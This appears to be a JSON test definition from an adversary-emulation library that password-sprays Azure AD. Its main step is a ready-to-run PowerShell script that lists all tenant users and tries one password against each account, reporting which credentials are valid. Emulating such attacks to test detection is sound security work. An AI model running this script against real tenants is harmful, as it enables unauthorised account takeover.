{
  "id": "a8aa2d3e-1c52-4016-bc73-0f8854cfa80a",
  "name": "Password spray all Azure AD users with a single password",
  "description": "Attempt to brute force all Azure AD users with a single password (called \"password spraying\") via AzureAD Powershell module.\nValid credentials are only needed to fetch the list of Azure AD users.\n",
  "platforms": [
    "azure-ad"
  ],
  "steps": [
    {
      "id": "12c97992-5125-5543-b93a-0c78655e417f",
      "type": "execute-command",
      "data": {
        "command": "Import-Module -Name AzureAD\n$PWord = ConvertTo-SecureString -String \"#{valid_password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{valid_username}\", $Pword\nConnect-AzureAD -Credential $Credential \u003e $null\n\n($Users = Get-AzureADUser -All $true) \u003e $null\nDisconnect-AzureAD \u003e $null\n$PWord = ConvertTo-SecureString -String \"#{password}\" -AsPlainText -Force\n\n$Users | Foreach-Object {\n  $user = $_.UserPrincipalName\n  $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"$user\", $Pword\n  try {\n    Write-Host \" [-] Attempting #{password} on account ${user}.\"\n    Connect-AzureAD -Credential $Credential 2\u003e\u00261\u003e $null\n    # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success\n    Write-Host \" [!] ${user}:#{password} are valid credentials!`r`n\"\n    Disconnect-AzureAD \u003e $null\n  } catch {\n    Write-Host \" [-] ${user}:#{password} invalid credentials.`r`n\"\n  }\n}\nWrite-Host \"End of password spraying\"",
        "command_type": "powershell"
      },
      "elevation_required": false
    },
    {
      "id": "653fec79-d5a5-51b2-adcd-921a50cf09f5",
      "name": "Check dependency 1/1",
      "description": "AzureAD module must be installed.\n",
      "type": "execute-command",
      "data": {
        "command": "try {if (Get-InstalledModule -Name AzureAD -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}",
        "command_type": "powershell"
      },
      "elevation_required": false
    },
    {
      "id": "1fa9d886-4e7b-5fde-9622-fecd2533f775",
      "name": "Resolve dependency 1/1",
      "description": "AzureAD module must be installed.\n",
      "type": "execute-command",
      "data": {
        "command": "Install-Module -Name AzureAD -Force",
        "command_type": "powershell"
      },
      "elevation_required": false
    },
    {
      "id": "653fec79-d5a5-51b2-adcd-921a50cf09f5",
      "name": "Re-check dependency 1/1",
      "description": "AzureAD module must be installed.\n",
      "type": "execute-command",
      "data": {
        "command": "try {if (Get-InstalledModule -Name AzureAD -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}",
        "command_type": "powershell"
      },
      "elevation_required": false
    }
  ],
  "flows": [
    {
      "s": "653fec79-d5a5-51b2-adcd-921a50cf09f5",
      "p": "on-success",
      "o": "12c97992-5125-5543-b93a-0c78655e417f"
    },
    {
      "s": "653fec79-d5a5-51b2-adcd-921a50cf09f5",
      "p": "on-failure",
      "o": "1fa9d886-4e7b-5fde-9622-fecd2533f775"
    },
    {
      "s": "1fa9d886-4e7b-5fde-9622-fecd2533f775",
      "p": "on-success",
      "o": "653fec79-d5a5-51b2-adcd-921a50cf09f5"
    },
    {
      "s": "653fec79-d5a5-51b2-adcd-921a50cf09f5",
      "p": "on-failure",
      "o": "12c97992-5125-5543-b93a-0c78655e417f"
    }
  ],
  "tags": [
    "T1110",
    "T1110.003"
  ],
  "input_arguments": [
    {
      "name": "valid_password",
      "type": "string",
      "description": "Valid password to authenticate as valid_username in the \u003cvalid_ms_account\u003e",
      "value": "iamthebatman"
    },
    {
      "name": "password",
      "type": "string",
      "description": "Single password we will attempt to auth with (if you need several passwords, then it is a bruteforce so see T1110.001)",
      "value": "P@ssw0rd!"
    },
    {
      "name": "valid_username",
      "type": "string",
      "description": "Valid username to retrieve Azure AD users. We encourage users running this atomic to add a valid microsoft account domain; for eg \u003cvalid_test_user\u003e@\u003cvalid_ms_account.com\u003e",
      "value": "bruce.wayne@contoso.com"
    }
  ]
}